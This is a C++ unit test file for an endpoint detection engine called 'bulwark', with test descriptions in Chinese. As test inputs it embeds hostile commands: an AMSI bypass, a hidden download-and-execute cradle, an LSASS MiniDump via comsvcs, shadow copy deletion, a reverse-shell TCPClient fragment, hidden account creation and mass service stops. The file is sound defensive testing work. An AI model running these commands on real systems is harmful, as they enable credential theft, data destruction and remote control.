#include "bulwark/engine/AmsiScanPolicy.h"
#include "bulwark/engine/CommandBurstMonitor.h"
#include "bulwark/engine/CommandLineAnalyzer.h"
#include "bulwark/engine/DgaDomainAnalyzer.h"
#include "bulwark/engine/DownloaderBehaviorMonitor.h"
#include "bulwark/engine/NetworkBehaviorMonitor.h"
#include "bulwark/engine/RansomwareBehaviorMonitor.h"
#include "bulwark/engine/ThreatDetector.h"
#include "bulwark/engine/TrustPolicy.h"
#include "bulwark/models/DefenseRule.h"
#include "bulwark/models/Enums.h"
#include "bulwark/models/SecurityEvent.h"

#include <QDateTime>
#include <QTimeZone>

#include <cstdio>

namespace {

using bulwark::EventType;
using bulwark::SecurityEvent;
using bulwark::engine::CommandLineAnalyzer;

int gChecks = 0;
int gFailed = 0;

void check(bool condition, const char* name)
{
    ++gChecks;
    if (condition)
        return;
    ++gFailed;
    std::fprintf(stderr, "FAIL: %s\n", name);
}

QString lower(const char* s) { return QString::fromUtf8(s).toLower(); }

QDateTime at(int seconds)
{
    return QDateTime(QDate(2026, 1, 15), QTime(12, 0), QTimeZone::UTC).addSecs(seconds);
}

SecurityEvent event(EventType type, int pid, const char* actor, const char* target, int seconds)
{
    SecurityEvent e;
    e.type = type;
    e.actorPid = pid;
    e.actorPath = QString::fromUtf8(actor);
    e.target = QString::fromUtf8(target);
    e.timestampUtc = at(seconds);
    return e;
}

SecurityEvent launch(int pid, int parentPid, const char* image, int seconds)
{
    SecurityEvent e = event(EventType::ProcessCreate, pid, image, image, seconds);
    e.parentPid = parentPid;
    return e;
}

void testPowerShellFlags()
{
    const auto encoded = [](const char* s) { return CommandLineAnalyzer::hasEncodedCommandArgument(lower(s)); };
    const auto hidden = [](const char* s) { return CommandLineAnalyzer::hasHiddenWindowFlag(lower(s)); };

    check(encoded("powershell -nop -w hidden -enc SQBFAFgA"), "-enc 后跟 Base64 是编码命令");
    check(encoded("powershell.exe -EncodedCommand JABhAD0AMQA="), "完整写法 -EncodedCommand");
    check(encoded("pwsh -ec SQBFAFgAKAA="), "缩写 -ec");
    check(encoded("powershell -e SQBFAFgAKAA="), "缩写 -e");
    check(!encoded("powershell -Command \"gci | Out-File list.txt -Enc utf8\""), "Out-File -Enc utf8 不是编码命令");
    check(!encoded("powershell -c \"Out-File x.txt -en bigendianunicode\""), "编码名 bigendianunicode 不是载荷");
    check(!encoded("powershell -Command \"Get-Content a.txt -Encoding UTF8\""), "-Encoding 不是 -EncodedCommand");
    check(!encoded("powershell -ep bypass -file a.ps1"), "-ep 是执行策略");

    check(hidden("powershell -w hidden -c x"), "-w hidden");
    check(hidden("powershell -win hidden -c x"), "-win hidden");
    check(hidden("powershell -WindowStyle Hidden -File a.ps1"), "-WindowStyle Hidden");
    check(hidden("powershell -windowstyle:hidden -c x"), "-windowstyle:hidden");
    check(hidden("powershell -w h -c x"), "-w h");
    check(!hidden("powershell -c \"Get-ChildItem C:\\x -Hidden -Recurse\""), "Get-ChildItem -Hidden 不是隐藏窗口");
    check(!hidden("powershell -c \"Start-Process a.exe -Wait\""), "-Wait 不是隐藏窗口");
    check(!hidden("cmd /c start /w helper.exe"), "start /w 不是隐藏窗口");
}

void testUrlsAndAccounts()
{
    const auto ip = [](const char* s) { return CommandLineAnalyzer::hasIpLiteralUrl(lower(s)); };
    const auto hiddenAccount = [](const char* s) { return CommandLineAnalyzer::createsHiddenAccount(lower(s)); };

    check(ip("iwr http://203.0.113.9/a.exe -OutFile a.exe"), "公网 IP 直连");
    check(ip("curl -o x http://198.51.100.7:8080/x"), "带端口的公网 IP");
    check(!ip("curl -o agent.exe http://10.0.0.5/agent.exe"), "10/8 内网不算");
    check(!ip("iwr http://192.168.1.20/a"), "192.168/16 内网不算");
    check(!ip("iwr http://172.20.0.3/a"), "172.16/12 内网不算");
    check(!ip("iwr https://dl.example.com/a.exe"), "域名不算");

    check(hiddenAccount("net user support$ P@ssw0rd /add"), "账户名以 $ 结尾");
    check(hiddenAccount("cmd /c net1 user backup$ x /add"), "经 net1 建隐藏账户");
    check(!hiddenAccount("net user svc_backup P@ss$w0rd /add"), "口令里带 $ 不是隐藏账户");
    check(!hiddenAccount("net user support$ /delete"), "删除账户不是创建");
}

void testAmsiPolicy()
{
    const auto blocks = [](const char* s) { return bulwark::engine::amsiShouldBlock(QString::fromUtf8(s)).block; };

    check(blocks("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                 ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"),
          "AMSI 致盲代码");
    check(blocks("Start-Process powershell -ArgumentList '-w hidden -c iex (New-Object Net.WebClient)"
                 ".DownloadString(''http://x/a'')'"),
          "下载即执行 + 隐藏窗口");
    check(blocks("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full"),
          "comsvcs MiniDump");
    check(blocks("vssadmin delete shadows /all /quiet"), "删光卷影");
    check(blocks("$c = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444); $s = $c.GetStream();"
                 " $d = (New-Object Text.ASCIIEncoding).GetString($b); iex $d"),
          "反弹 Shell");

    check(!blocks("Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient)"
                  ".DownloadString('https://community.chocolatey.org/install.ps1'))"),
          "Chocolatey 官方安装不拦");
    check(!blocks("irm get.scoop.sh | iex"), "Scoop 官方安装不拦");
    check(!blocks("$r = Invoke-WebRequest https://x.example/m.psm1; iex $r.Content;"
                  " Get-ChildItem | Out-File list.txt -Enc utf8"),
          "下载执行 + Out-File -Enc utf8 不算编码");
    check(!blocks("$c = New-Object System.Net.Sockets.TcpClient; $c.Connect('db01', 1433); $c.Connected"),
          "TCP 端口探测不拦");
    check(!blocks("vssadmin delete shadows /for=C: /oldest /quiet"), "清理最旧卷影不拦");
    check(!blocks("vssadmin list shadows"), "列出卷影不拦");
    check(!blocks("Set-MpPreference -DisableRealtimeMonitoring $false"), "重新开启实时防护不拦");
}

void testDga()
{
    using bulwark::engine::DgaDomainAnalyzer;
    check(DgaDomainAnalyzer::analyze(QStringLiteral("xkqvbzrmthnwpldj.top")).score > 0, "高熵无元音域名");
    check(DgaDomainAnalyzer::analyze(QStringLiteral("www.microsoft.com")).score == 0, "常见域名");
    check(DgaDomainAnalyzer::analyze(QStringLiteral("github.com")).score == 0, "短域名");
    check(DgaDomainAnalyzer::analyze(QStringLiteral("d3k2j4h5g6f7s8x9.cloudfront.net")).score == 0,
          "CDN 随机子域不算");
}

void testRansomwareMonitor()
{
    bulwark::engine::RansomwareBehaviorMonitor m;
    const char* crypt = "C:\\Users\\u\\Downloads\\crypt.exe";
    const auto write = [&](int pid, const char* actor, const char* target, int sec) {
        return m.observe(event(EventType::FileWrite, pid, actor, target, sec));
    };

    check(!write(100, crypt, "C:\\Users\\u\\Documents\\a.docx.locked", 0).hardSignal, "第 1 个勒索扩展名不判定");
    check(!write(100, crypt, "C:\\Users\\u\\Documents\\b.docx.locked", 1).hardSignal, "第 2 个勒索扩展名不判定");
    check(write(100, crypt, "C:\\Users\\u\\Documents\\c.docx.locked", 2).hardSignal, "第 3 个勒索扩展名判定");
    check(write(100, crypt, "C:\\Users\\u\\Documents\\notes.txt", 3).hardSignal, "判定后的每次改写继续报");
    check(!write(100, "C:\\Program Files\\Office\\winword.exe", "C:\\Users\\u\\Documents\\d.docx", 4).hardSignal,
          "PID 被另一个程序复用后状态重新计算");
}

void testDownloaderMonitor()
{
    bulwark::engine::DownloaderBehaviorMonitor m;
    const auto drop = [&](int pid, const char* writer, const char* target, int sec, const char* cmd = "",
                          bool signedWriter = false) {
        SecurityEvent e = event(EventType::FileWrite, pid, writer, target, sec);
        e.commandLine = QString::fromUtf8(cmd);
        e.actorSigned = signedWriter;
        return m.observe(e);
    };
    const auto run = [&](int pid, int parentPid, const char* image, int sec) {
        return m.observe(launch(pid, parentPid, image, sec));
    };

    drop(200, "C:\\Users\\u\\Downloads\\tool-setup.exe", "C:\\Users\\u\\AppData\\Local\\Temp\\is-AB12.tmp\\helper.exe", 0);
    check(!run(201, 200, "C:\\Users\\u\\AppData\\Local\\Temp\\is-AB12.tmp\\helper.exe", 2).hardSignal,
          "Inno 安装包运行自己解出的帮助程序不算释放器");

    drop(210, "C:\\Users\\u\\Documents\\inv.exe", "C:\\Users\\u\\AppData\\Local\\Temp\\run.exe", 10);
    check(run(211, 210, "C:\\Users\\u\\AppData\\Local\\Temp\\run.exe", 20).hardSignal,
          "未签名程序落地到 %TEMP% 并启动是释放器");

    drop(220, "C:\\Users\\u\\Documents\\port.exe", "C:\\Users\\u\\AppData\\Local\\Temp\\late.exe", 30);
    check(!run(221, 220, "C:\\Users\\u\\AppData\\Local\\Temp\\late.exe", 30 + 301).hardSignal,
          "超出 5 分钟窗口不再关联");

    drop(230, "C:\\Program Files\\App\\app.exe", "C:\\Users\\u\\AppData\\Local\\Temp\\upd.exe", 40, "", true);
    check(!run(231, 230, "C:\\Users\\u\\AppData\\Local\\Temp\\upd.exe", 41).hardSignal,
          "签名 / 已安装程序落地并启动是安装更新链");

    drop(240, "C:\\Windows\\System32\\cmd.exe", "C:\\Users\\u\\AppData\\Local\\Temp\\h.exe", 50,
         "cmd.exe /c copy a.bin %TEMP%\\h.exe", true);
    check(!run(241, 240, "C:\\Users\\u\\AppData\\Local\\Temp\\h.exe", 51).hardSignal,
          "脚本宿主落地但没取远端,只记软信号");

    drop(250, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "C:\\Users\\u\\AppData\\Local\\Temp\\a.exe", 60,
         "powershell -c \"iwr https://x.example/a.exe -OutFile $env:TEMP\\a.exe\"", true);
    check(run(251, 250, "C:\\Users\\u\\AppData\\Local\\Temp\\a.exe", 61).hardSignal,
          "脚本宿主取远端落地并启动未签名载荷是下载器");

    const char* ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    SecurityEvent net = event(EventType::NetworkConnect, 260, ps, "198.51.100.1:443", 70);
    net.actorSigned = true;
    m.observe(net);
    drop(260, ps, "C:\\Users\\u\\AppData\\Local\\Temp\\tool.exe", 71, "powershell -File C:\\Users\\u\\install.ps1", true);
    check(!run(261, 260, "C:\\Users\\u\\AppData\\Local\\Temp\\tool.exe", 72).hardSignal,
          "安装脚本自己联网下载再运行:命令行没取远端,只记软信号");
}

void testBeacon()
{
    bulwark::engine::NetworkBehaviorMonitor m;
    const auto connect = [&](const char* actor, int sec, bool signedActor) {
        SecurityEvent e = event(EventType::NetworkConnect, 300, actor, "198.51.100.42:8443", sec);
        e.actorSigned = signedActor;
        return m.observe(e).beacon.score;
    };

    for (int i = 0; i < 5; ++i)
        check(connect("C:\\Users\\u\\AppData\\Roaming\\upd.exe", i * 60, false) == 0, "前 5 拍不成周期");
    check(connect("C:\\Users\\u\\AppData\\Roaming\\upd.exe", 5 * 60, false) > 0, "第 6 拍规整周期成形");
    check(connect("C:\\Users\\u\\AppData\\Roaming\\upd.exe", 6 * 60, false) > 0, "成形后每拍都报");

    for (int i = 0; i < 8; ++i)
        check(connect("C:\\Program Files\\Sync\\sync.exe", i * 60, true) == 0, "签名程序的心跳不计");

    const int jitter[] = { 0, 30, 120, 165, 285, 345, 465 };
    int last = 0;
    for (const int t : jitter)
        last = connect("C:\\Users\\u\\AppData\\Roaming\\chat.exe", t, false);
    check(last == 0, "间隔抖动大的外联不算信标");
}

void testCommandBurst()
{
    bulwark::engine::CommandBurstMonitor m;
    int nextPid = 5000;
    const auto run = [&](int parentPid, const char* parent, const char* image, const char* cmd, int sec) {
        SecurityEvent e = launch(nextPid++, parentPid, image, sec);
        e.parentPath = QString::fromUtf8(parent);
        e.commandLine = QString::fromUtf8(cmd);
        return m.observe(e);
    };
    const char* cmdExe = "C:\\Windows\\System32\\cmd.exe";
    const char* net = "C:\\Windows\\System32\\net.exe";
    const char* sc = "C:\\Windows\\System32\\sc.exe";
    const char* dropper = "C:\\Users\\u\\AppData\\Local\\Temp\\x.exe";

    const char* recon[][2] = {
        { "C:\\Windows\\System32\\whoami.exe", "whoami /all" },
        { "C:\\Windows\\System32\\ipconfig.exe", "ipconfig /all" },
        { net, "net user" },
        { "C:\\Windows\\System32\\nltest.exe", "nltest /dclist:corp" },
        { "C:\\Windows\\System32\\systeminfo.exe", "systeminfo" },
    };
    bulwark::engine::CommandBurstMonitor::Result r;
    for (int i = 0; i < 4; ++i)
        r = run(500, dropper, recon[i][0], recon[i][1], i);
    check(r.discovery.score == 0, "4 类侦察命令不成批");
    r = run(500, dropper, recon[4][0], recon[4][1], 4);
    check(r.discovery.hardSignal && r.discovery.score == 40, "投递目录程序 1 分钟内 5 类侦察是硬指标");
    check(run(500, dropper, "C:\\Windows\\System32\\klist.exe", "klist", 5).discovery.score == 0,
          "冷却期内不重复报");

    for (int i = 0; i < 5; ++i)
        r = run(600, cmdExe, recon[i][0], recon[i][1], 10 + i);
    check(r.discovery.score == 30 && !r.discovery.hardSignal, "运维脚本成批侦察只记软信号");

    const char* lookalikes[] = { "build.exe --checklist", "tool.exe --shipconfig", "tool.exe --mywhoami",
                                 "tool.exe --pre-systeminfo", "tool.exe --nonslookup" };
    for (int i = 0; i < 5; ++i)
        r = run(700, cmdExe, "C:\\tools\\tool.exe", lookalikes[i], 20 + i);
    check(r.discovery.score == 0, "单词中间出现的命令名不算侦察");

    for (int i = 0; i < 5; ++i)
        r = run(710, cmdExe, net, "net user bob P@ss /add", 30 + i);
    check(r.discovery.score == 0, "建号不算侦察");

    const char* wuReset[] = { "net stop bits", "net stop wuauserv", "net stop appidsvc", "net stop cryptsvc" };
    for (int i = 0; i < 4; ++i)
        r = run(800, cmdExe, net, wuReset[i], 40 + i);
    check(r.serviceStop.score == 0, "重置更新组件停 4 个服务不算清场");
    r = run(800, cmdExe, net, "net stop msiserver", 44);
    check(r.serviceStop.score == 30 && !r.serviceStop.hardSignal, "运维脚本停 5 个服务只记软信号");

    const char* sweep[][2] = {
        { net, "net stop \"SQLWriter\" /y" }, { sc, "sc stop VeeamBackupSvc" },
        { "C:\\Windows\\System32\\taskkill.exe", "taskkill /f /im sqlservr.exe" },
        { "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell Stop-Service -Name MSExchangeIS" },
        { net, "net stop vss" }, { net, "net1 stop sophos" }, { net, "net stop \"backup exec\"" },
        { sc, "sc.exe stop wbengine" },
    };
    for (int i = 0; i < 4; ++i)
        r = run(900, cmdExe, sweep[i][0], sweep[i][1], 50 + i);
    check(r.serviceStop.score == 0, "清场前 4 个不报");
    r = run(900, cmdExe, sweep[4][0], sweep[4][1], 54);
    check(r.serviceStop.score == 30 && !r.serviceStop.hardSignal, "第 5 个先报软信号");
    for (int i = 5; i < 7; ++i)
        r = run(900, cmdExe, sweep[i][0], sweep[i][1], 50 + i);
    check(r.serviceStop.score == 0, "软信号冷却期内不重复报");
    r = run(900, cmdExe, sweep[7][0], sweep[7][1], 57);
    check(r.serviceStop.hardSignal && r.serviceStop.score == 50, "1 分钟内停 8 个服务升为硬指标");

    for (int i = 0; i < 5; ++i)
        r = run(950, dropper, sweep[i][0], sweep[i][1], 60 + i);
    check(r.serviceStop.hardSignal, "投递目录程序停 5 个服务就是硬指标");

    for (int i = 0; i < 4; ++i)
        run(990, cmdExe, sweep[i][0], sweep[i][1], 100 + i);
    r = run(990, cmdExe, sweep[4][0], sweep[4][1], 100 + 70);
    check(r.serviceStop.score == 0, "超出 1 分钟窗口的停服务不累计");

    // 多打空格、换成 Tab、给程序名加引号,执行起来是同一条命令,计数不能因此漏掉。
    const char* reconSpaced[] = { "cmd /c net  view", "cmd /c net\tshare", "cmd /c \"net\" accounts",
                                  "cmd /c arp  -a", "cmd /c route\tprint" };
    for (int i = 0; i < 4; ++i)
        r = run(1100, dropper, cmdExe, reconSpaced[i], 200 + i);
    check(r.discovery.score == 0, "空白 / 引号写法的 4 类侦察命令不成批");
    r = run(1100, dropper, cmdExe, reconSpaced[4], 204);
    check(r.discovery.hardSignal && r.discovery.score == 40, "空白 / 引号写法的侦察命令照样计数");

    const char* sweepSpaced[] = { "net  stop  SQLWriter /y", "net\tstop\tVeeamBackupSvc",
                                  "\"net\" \"stop\" MSExchangeIS", "sc  stop  wbengine",
                                  "\"sc.exe\"  stop  sophos" };
    for (int i = 0; i < 4; ++i)
        r = run(1200, dropper, net, sweepSpaced[i], 220 + i);
    check(r.serviceStop.score == 0, "空白 / 引号写法停 4 个服务不报");
    r = run(1200, dropper, net, sweepSpaced[4], 224);
    check(r.serviceStop.hardSignal, "空白 / 引号写法的停服务照样计数");

    // 同一个服务换着写法停 5 次仍是 1 个:规整不能把带引号和不带引号的名字记成两个。
    const char* sameService[] = { "net stop 'Fax'", "net stop \"Fax\"", "net  stop Fax", "\"net\" stop fax",
                                  "net stop\tFAX" };
    for (int i = 0; i < 5; ++i)
        r = run(1300, dropper, net, sameService[i], 240 + i);
    check(r.serviceStop.score == 0, "同一个服务换写法反复停只算 1 个");
}

void testRenamedTool()
{
    const auto analyze = [](const char* path, const char* original) {
        SecurityEvent e = launch(1000, 4, path, 0);
        e.originalFileName = QString::fromUtf8(original);
        e.actorSigned = true;
        bulwark::engine::ThreatDetector::analyze(e);
        return e;
    };
    const auto renamed = [](const SecurityEvent& e) {
        return e.riskReasons.join(QLatin1Char('\n')).contains(QStringLiteral("被改名为"));
    };

    const SecurityEvent temp = analyze("C:\\Users\\u\\AppData\\Local\\Temp\\svc.exe", "powershell.exe");
    check(renamed(temp) && temp.hasThreatIndicator && temp.riskScore >= 80, "投递目录里改名运行的 PowerShell 判 80");
    const SecurityEvent tools = analyze("D:\\tools\\ps.exe", "powershell.exe");
    check(renamed(tools) && tools.hasThreatIndicator && tools.riskScore >= 60, "其他目录里改名运行的 PowerShell 判 60");
    check(renamed(analyze("C:\\Users\\u\\Downloads\\px.exe", "psexec.c")), "改名的 PsExec");
    check(!renamed(analyze("C:\\Users\\u\\Downloads\\PsExec64.exe", "psexec.c")), "PsExec64 是原名");
    check(!renamed(analyze("C:\\Users\\u\\.dotnet\\tools\\pwsh.exe", "pwsh.dll")), "pwsh 的原始文件名是 pwsh.dll");
    check(!renamed(analyze("C:\\Users\\u\\Downloads\\tool.exe", "")), "没读到原始文件名不判");
    check(!renamed(analyze("C:\\Users\\u\\Downloads\\setup.exe", "setup.exe")), "非系统工具不判");
}

bool hasReason(const SecurityEvent& e, const char* fragment)
{
    return e.riskReasons.join(QLatin1Char('\n')).contains(QString::fromUtf8(fragment));
}

void testHiddenExecution()
{
    using bulwark::engine::ThreatDetector;
    using bulwark::engine::TrustPolicy;

    const auto padded = [](const char* image, int spaces) {
        SecurityEvent e = launch(1100, 4, image, 0);
        e.actorSigned = true;
        e.commandLine = QStringLiteral("cmd.exe /c") + QString(spaces, QLatin1Char(' '))
                      + QStringLiteral("powershell -c Get-Date");
        ThreatDetector::analyze(e);
        return e;
    };
    const SecurityEvent lnk = padded("C:\\Windows\\System32\\cmd.exe", 120);
    check(hasReason(lnk, "连续空白") && lnk.hasThreatIndicator, "cmd 参数里夹 120 个空格是参数隐藏");
    check(!hasReason(padded("C:\\Windows\\System32\\cmd.exe", 40), "连续空白"), "40 个空格不算");
    check(!hasReason(padded("C:\\Program Files\\App\\app.exe", 200), "连续空白"), "非脚本宿主不看空白");
    SecurityEvent newlines = launch(1101, 4, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", 0);
    newlines.actorSigned = true;
    newlines.commandLine = QStringLiteral("powershell -c ") + QString(70, QLatin1Char('\n')) + QStringLiteral("iex $x");
    ThreatDetector::analyze(newlines);
    check(hasReason(newlines, "连续空白"), "换行填充同样算");

    const auto spoof = [](const char* creator) {
        SecurityEvent e = launch(1200, 1199, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", 0);
        e.actorSigned = true;
        e.parentPath = QString::fromUtf8(creator);
        e.spoofedParentPid = 900;
        e.spoofedParentPath = QStringLiteral("C:\\Windows\\explorer.exe");
        ThreatDetector::analyze(e);
        return e;
    };
    const SecurityEvent macro = spoof("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE");
    check(hasReason(macro, "父进程被伪造") && macro.riskScore >= 80, "Word 伪造父进程判 80");
    const SecurityEvent dropper = spoof("C:\\Users\\u\\AppData\\Local\\Temp\\a.exe");
    check(dropper.riskScore >= 80, "投递目录里的程序伪造父进程判 80");
    const SecurityEvent userApp = spoof("C:\\Users\\u\\Tools\\launcher.exe");
    check(userApp.hasThreatIndicator && userApp.riskScore >= 60 && userApp.riskScore < 80, "用户目录程序伪造父进程判 60");
    const SecurityEvent vendor = spoof("C:\\Program Files\\Vendor\\agent.exe");
    check(hasReason(vendor, "父进程被伪造") && !vendor.hasThreatIndicator, "Program Files 下的软件只记软信号");

    const auto ghost = [](const char* path) {
        SecurityEvent e = launch(1300, 4, path, 0);
        e.actorImageMissing = true;
        ThreatDetector::analyze(e);
        return e;
    };
    check(ghost("C:\\Users\\u\\AppData\\Local\\Temp\\x.exe").riskScore >= 80, "投递目录里映像消失判 80");
    const SecurityEvent ghostElsewhere = ghost("C:\\Users\\u\\Apps\\tool.exe");
    check(ghostElsewhere.hasThreatIndicator && ghostElsewhere.riskScore >= 70 && ghostElsewhere.riskScore < 80,
          "其他位置映像消失判 70");

    check(TrustPolicy::isProcessCreationBroker(QStringLiteral("C:\\Windows\\System32\\svchost.exe")),
          "System32 的 svchost 是系统代办");
    check(TrustPolicy::isProcessCreationBroker(QStringLiteral("C:\\Windows\\SysWOW64\\dllhost.exe")),
          "SysWOW64 的 dllhost 是系统代办");
    check(!TrustPolicy::isProcessCreationBroker(QStringLiteral("C:\\Users\\Public\\svchost.exe")),
          "目录外的同名程序不是代办");
    check(!TrustPolicy::isProcessCreationBroker(QStringLiteral("C:\\Windows\\explorer.exe")),
          "资源管理器不是代办");
}

void testImageAnomalyFlags()
{
    using bulwark::engine::ThreatDetector;

    const auto created = [](int flags) {
        SecurityEvent e = launch(1400, 4, "C:\\Program Files\\Vendor\\app.exe", 0);
        e.actorSigned = true;
        e.actorImageFlags = flags;
        ThreatDetector::analyze(e);
        return e;
    };
    const SecurityEvent ghost = created(SecurityEvent::ImageDeletePending);
    check(hasReason(ghost, "删除挂起") && ghost.hasThreatIndicator && ghost.riskScore >= 80,
          "映像创建时已删除挂起判 80(幽灵化)");
    const SecurityEvent txf = created(SecurityEvent::ImageTransacted);
    check(hasReason(txf, "NTFS 事务") && txf.riskScore >= 80, "映像来自未提交事务判 80(替身)");
    const SecurityEvent herpa = created(SecurityEvent::ImageWritable);
    check(hasReason(herpa, "写权限") && herpa.hasThreatIndicator && herpa.riskScore >= 70,
          "映像带写权限打开判 70(Herpaderping)");
    const SecurityEvent clean = created(0);
    check(!clean.hasThreatIndicator && clean.riskScore == 0, "正常创建的进程不加分");

    const bulwark::SecurityEvent roundTrip = bulwark::SecurityEvent::fromJson(herpa.toJson());
    check(roundTrip.actorImageFlags == SecurityEvent::ImageWritable, "映像异常位经 JSON 往返不丢");
}

void testRegistryRestoreMatching()
{
    using bulwark::DefenseRule;
    using bulwark::RegistryOperation;

    DefenseRule restoreOnly;
    restoreOnly.type = bulwark::EventType::RegistryWrite;
    restoreOnly.targetPattern = QStringLiteral("*");
    restoreOnly.requireRegOp = RegistryOperation::RestoreKey;

    DefenseRule setOnly;
    setOnly.type = bulwark::EventType::RegistryWrite;
    setOnly.targetPattern = QStringLiteral("*\\CurrentVersion\\Run*");
    setOnly.requireRegOp = RegistryOperation::SetValue;

    const auto reg = [](RegistryOperation op, const char* target) {
        SecurityEvent e;
        e.type = bulwark::EventType::RegistryWrite;
        e.actorPid = 1500;
        e.actorPath = QStringLiteral("C:\\Users\\u\\Downloads\\x.exe");
        e.target = QString::fromUtf8(target);
        e.registryOp = op;
        return e;
    };
    const char* run = "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    check(restoreOnly.matches(reg(RegistryOperation::RestoreKey, run)), "只认恢复的规则命中恢复事件");
    check(!restoreOnly.matches(reg(RegistryOperation::Unknown, run)),
          "只认恢复的规则不吃方向未知的注册表事件");
    check(!restoreOnly.matches(reg(RegistryOperation::SetValue, run)), "只认恢复的规则不吃普通设值");
    check(setOnly.matches(reg(RegistryOperation::RestoreKey, run)), "整棵恢复对只认设值的规则按设值算");
    check(setOnly.matches(reg(RegistryOperation::Unknown, run)), "设值规则对方向未知的事件照旧放行过滤");
    check(!setOnly.matches(reg(RegistryOperation::DeleteValue, run)), "设值规则不吃删值");

    const SecurityEvent e = reg(RegistryOperation::RestoreKey, run);
    check(bulwark::SecurityEvent::fromJson(e.toJson()).registryOp == RegistryOperation::RestoreKey,
          "恢复方向经 JSON 往返不丢");
}

}

int main()
{
    testPowerShellFlags();
    testUrlsAndAccounts();
    testAmsiPolicy();
    testDga();
    testRansomwareMonitor();
    testDownloaderMonitor();
    testBeacon();
    testCommandBurst();
    testRenamedTool();
    testHiddenExecution();
    testImageAnomalyFlags();
    testRegistryRestoreMatching();
    std::printf("detection_policy_unit: %d/%d passed\n", gChecks - gFailed, gChecks);
    return gFailed == 0 ? 0 : 1;
}
